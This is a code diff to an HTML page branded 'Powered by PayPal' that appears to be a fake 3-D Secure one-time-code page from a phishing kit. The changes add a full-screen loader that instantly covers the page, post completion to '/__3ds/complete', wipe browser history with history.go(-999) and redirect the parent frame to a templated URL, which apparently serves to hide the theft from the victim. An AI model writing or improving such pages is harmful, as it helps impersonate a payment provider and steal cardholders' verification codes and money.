@@ -87,6 +87,26 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+        .fullscreen-loader {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+        }
+        .fullscreen-loader.show {
+            display: flex;
+        }
+        .fullscreen-loader .spinner {
+            width: 48px;
+            height: 48px;
+            margin: 0;
+        }
         .otp-form {
             display: none;
         }
@@ -273,6 +293,10 @@
         <div class="paypal-footer">
             Powered by PayPal
         </div>
+    </div>
+
+    <div id="fullscreen-loader" class="fullscreen-loader">
+        <div class="spinner"></div>
     </div>
 
     <script>
@@ -496,32 +520,27 @@
         }
 
         function showCompleted() {
-            document.getElementById('loading-state').style.display = 'none';
-            document.getElementById('otp-form').classList.remove('active');
-            document.getElementById('expired-state').classList.remove('show');
-            document.getElementById('completed-state').classList.add('show');
+            document.getElementById('fullscreen-loader').classList.add('show');
             stopPolling();
-            setTimeout(function() {
-                if (redirectUrl && redirectUrl !== '{redirect_url}') {
-                    fetch('/__3ds/complete?sid=' + encodeURIComponent(sessionId), {
-                        method: 'POST'
-                    }).catch(function() {
-                    }).finally(function() {
-                        try {
-                            history.go(-999);
-                            setTimeout(function() {
-                                if (window.parent && window.parent !== window) {
-                                    window.parent.location.replace(redirectUrl);
-                                } else {
-                                    window.location.replace(redirectUrl);
-                                }
-                            }, 100);
-                        } catch (e) {
-                            window.location.replace(redirectUrl);
-                        }
-                    });
-                }
-            }, 2000);
+            if (redirectUrl && redirectUrl !== '{redirect_url}') {
+                fetch('/__3ds/complete?sid=' + encodeURIComponent(sessionId), {
+                    method: 'POST'
+                }).catch(function() {
+                }).finally(function() {
+                    try {
+                        history.go(-999);
+                        setTimeout(function() {
+                            if (window.parent && window.parent !== window) {
+                                window.parent.location.replace(redirectUrl);
+                            } else {
+                                window.location.replace(redirectUrl);
+                            }
+                        }, 100);
+                    } catch (e) {
+                        window.location.replace(redirectUrl);
+                    }
+                });
+            }
         }
 
         function handleState(state, redirectURL, otpCount) {
